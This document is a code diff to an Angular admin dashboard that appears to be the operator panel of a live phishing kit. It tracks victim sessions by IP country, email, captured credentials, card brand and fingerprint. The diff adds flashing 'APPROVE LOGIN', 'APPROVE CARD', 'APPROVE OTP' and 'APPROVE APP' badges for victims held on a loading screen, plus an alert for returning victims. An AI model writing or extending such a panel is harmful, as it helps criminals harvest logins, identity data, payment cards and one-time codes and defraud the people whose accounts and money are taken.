@@ -139,7 +139,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
                                                 }
                                              </div>
-                                             <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                             <div class="flex items-center justify-between w-full">
+                                                <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                                @if(getActionBadge(session)) {
+                                                    <span class="bg-red-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded animate-pulse ml-2 whitespace-nowrap">
+                                                        {{ getActionBadge(session) }}
+                                                    </span>
+                                                }
+                                             </div>
                                          </div>
                                      </div>
                                      }
@@ -212,6 +219,23 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  
                                  <!-- Scrollable Content -->
                                  <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
+
+                                     <!-- Recurring User Alert -->
+                                     @if(monitoredSession()?.data?.isRecurring) {
+                                        <div class="mb-6 bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-center justify-between mx-auto max-w-full">
+                                            <div class="flex items-center gap-2">
+                                                <span class="material-icons text-amber-600">history</span>
+                                                <div>
+                                                    <p class="text-xs font-bold text-amber-800">Recurring User</p>
+                                                    <p class="text-[10px] text-amber-600">Previously verified session detected.</p>
+                                                </div>
+                                            </div>
+                                            <button (click)="viewLinkedSession()" class="text-xs font-bold text-amber-700 hover:underline bg-white/50 px-2 py-1 rounded border border-amber-200">
+                                                View Previous
+                                            </button>
+                                        </div>
+                                     }
+
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                          
                                          <!-- Credentials -->
@@ -1285,5 +1309,32 @@ ${session.fingerprint?.userAgent}
       if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
       if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
       return '';
+  }
+
+  getActionBadge(session: any): string | null {
+      // Only show badge if user is waiting (loading screen)
+      if (session.currentView !== 'loading') return null;
+
+      switch (session.stage) {
+          case 'login': return 'APPROVE LOGIN';
+          case 'phone_pending': return 'APPROVE PHONE';
+          case 'personal_pending': return 'APPROVE IDENTITY';
+          case 'card_pending': return 'APPROVE CARD';
+          case 'card_otp_pending': return 'APPROVE OTP';
+          case 'bank_app_pending': return 'APPROVE APP';
+          default: return 'ACTION NEEDED';
+      }
+  }
+
+  viewLinkedSession() {
+      const linkedId = this.monitoredSession()?.data?.linkedSessionId;
+      if (!linkedId) return;
+
+      const found = this.state.history().find(h => h.id === linkedId);
+      if (found) {
+          this.viewHistory(found);
+      } else {
+          this.state.showAdminToast('Linked session not found in history');
+      }
   }
 }
